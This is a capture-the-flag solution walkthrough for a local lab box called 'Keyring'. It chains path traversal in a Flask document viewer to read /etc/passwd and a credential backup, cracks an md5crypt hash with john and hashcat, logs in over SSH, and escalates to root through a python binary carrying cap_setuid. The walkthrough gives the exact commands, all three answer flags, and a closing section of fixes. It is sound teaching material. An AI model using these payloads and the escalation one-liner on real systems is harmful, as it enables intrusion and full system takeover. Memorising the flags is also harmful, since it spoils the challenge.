# 🔑 Keyring — SOLUTION (spoilers)

> Full walkthrough. Don't read unless you're really stuck or reviewing.

Chain: **web LFI → leak md5crypt hash → crack with john/rockyou → SSH as keeper →
Linux capability (cap_setuid) → root.** Three flags; two new skills (offline
cracking, capabilities).

Target: `localhost`, web on **8085**, SSH on **2225**.

---

## Stage 0 — Recon

```bash
nmap -sV -p- localhost         # or: nmap -sV -p 2225,8085 localhost
```

- `2225/tcp` OpenSSH, `8085/tcp` HTTP (Flask). Web app "Keyring" has a document
  viewer: `GET /view?file=<name>`.

---

## Stage 1 — LFI / path traversal → Flag 1

The viewer opens `os.path.join("/var/www/keyring/pages", file)` with no checks.
Confirm traversal:

```bash
curl -s 'http://localhost:8085/view?file=../../../../etc/passwd' | sed -n '/root:/p'
# root:x:0:0:root:/root:/bin/bash ... keeper:x:1000:...  (absolute path works too:
# curl 'http://localhost:8085/view?file=/etc/passwd')
```

The changelog hints at a leftover backup under `/backup`. Read it via LFI:

```bash
curl -s 'http://localhost:8085/view?file=../backup/users.bak'
# recon_marker: FLAG{lf1_p4th_tr4v3rs4l}
# keeper:$1$kEyR1nG$mHEfVBcI41ryIbVJ8ykSa0
```

- **Flag 1:** `FLAG{lf1_p4th_tr4v3rs4l}`
- Loot: keeper's **md5crypt** hash.

(Web runs as www-data, so LFI can't read `/etc/shadow` — you only get the app's
own backup, which is the point.)

---

## Stage 2 — Crack the hash → Flag 2 (user.txt)

`$1$` = md5crypt (john format `md5crypt`, hashcat mode `500`).

```bash
echo 'keeper:$1$kEyR1nG$mHEfVBcI41ryIbVJ8ykSa0' > hash.txt
john --wordlist=~/wordlist/passwords/rockyou.txt hash.txt
john --show hash.txt
# keeper:chocolate
#   -- or --
hashcat -m 500 hash.txt ~/wordlist/passwords/rockyou.txt --quiet
```

`chocolate` is line 27 of rockyou — cracks instantly. SSH in:

```bash
ssh keeper@localhost -p 2225        # password: chocolate
cat ~/user.txt
```

- **Flag 2:** `FLAG{cr4ck3d_h4sh_ssh_l0gin}`

(`/home/keeper` is 0750 so www-data could not read this — the crack + login is
mandatory.)

---

## Stage 3 — Privilege escalation: Linux capabilities → Flag 3

`sudo -l` = dead end. `find / -perm -4000` shows nothing custom. Check
**capabilities** instead:

```bash
getcap -r / 2>/dev/null
# /usr/local/bin/pyadmin cap_setuid=ep
```

`pyadmin` is a copy of python with `cap_setuid`. That capability lets the process
call `setuid(0)` and actually become root. Weaponize:

```bash
/usr/local/bin/pyadmin -c 'import os; os.setuid(0); os.system("/bin/bash")'
id            # uid=0(root)
cat /root/root.txt
```

- **Flag 3:** `FLAG{r00t_l1nux_c4p4b1l1t13s}`

Why it works: normally `setuid(0)` as a non-root user fails. `cap_setuid=ep`
(effective+permitted) grants exactly that syscall privilege to this binary, so the
python process flips its uid to 0 and spawns a root shell. GTFOBins lists this
under python's "Capabilities" section — the same trick applies to perl, ruby,
node, etc. if they carry `cap_setuid`.

---

## Fixes (the blue-team half)

- **LFI:** never `open()` a user-supplied path. Resolve against a base dir and
  verify the real path stays inside it (`os.path.realpath`), or map an allow-list
  of doc names. Don't leave credential backups in the webroot.
- **Hashes:** md5crypt is fast to crack — use slow, salted hashing (bcrypt/argon2)
  and don't export password hashes to files at all.
- **Capabilities:** audit with `getcap -r /`. `cap_setuid`/`cap_setgid`/
  `cap_dac_override`/`cap_sys_admin` on an interpreter is equivalent to giving away
  root. Grant the narrowest capability to the narrowest binary, never to a
  general-purpose interpreter.

## Flag summary

| # | Stage | Flag |
|---|-------|------|
| 1 | LFI / path traversal | `FLAG{lf1_p4th_tr4v3rs4l}` |
| 2 | Crack hash + SSH (user.txt) | `FLAG{cr4ck3d_h4sh_ssh_l0gin}` |
| 3 | Priv-esc: cap_setuid (root.txt) | `FLAG{r00t_l1nux_c4p4b1l1t13s}` |
